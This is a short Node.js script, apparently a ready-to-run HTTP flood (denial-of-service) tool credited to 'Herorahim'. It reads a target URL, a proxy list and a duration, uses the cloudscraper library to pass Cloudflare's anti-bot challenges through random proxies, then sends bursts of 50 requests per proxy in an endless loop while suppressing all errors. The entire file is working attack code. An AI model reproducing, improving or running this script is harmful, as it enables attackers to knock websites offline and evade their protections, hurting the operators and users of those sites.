var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.createTemplateTagFirstArg = function(a) {
  return (a.raw = a);
};
$jscomp.createTemplateTagFirstArgWithRaw = function(a, b) {
  a.raw = b;
  return a;
};
require("events").EventEmitter.defaultMaxListeners = 0;
var fs = require("fs"),
  CloudScraper = require("cloudscraper"),
  path = require("path");
5 !== process.argv.length &&
  (console.log("Developer By Herorahim"), process.exit(0));
var target = process.argv[2],
  time = process.argv[4],
  req_per_ip = 50,
  proxies = fs
    .readFileSync(path.join(__dirname, path.join('proxys', process.argv[3])), "utf-8")
    .replace(/\r/gi, "")
    .split("\n")
    .filter(Boolean);
function send_req() {
  var a = proxies[Math.floor(Math.random() * proxies.length)];
  new Promise(function(b, c) {
    CloudScraper(
      {
        uri: target,
        resolveWithFullResponse: !0,
        proxy: "http://" + a,
        challengesToSolve: 10
      },
      function(d, e) {
        if (d) {
          var f = proxies.indexOf(a);
          proxies.splice(f, 1);
        }
        b(e.request.headers);
        console.log(10 * Math.random());
      }
    );
  }).then(function(b) {
    for (var c = 0; c < req_per_ip; ++c)
      CloudScraper(
        {
          uri: target,
          headers: b,
          proxy: "http://" + a,
          followAllRedirects: !1
        },
        function(d, e) {}
      );
  });
}
setInterval(function() {
  send_req();
});
setTimeout(function() {
  console.log("Timeout");
  process.exit(0);
}, 1e3 * time);
process.on("uncaughtException", function(a) {});
process.on("unhandledRejection", function(a) {});
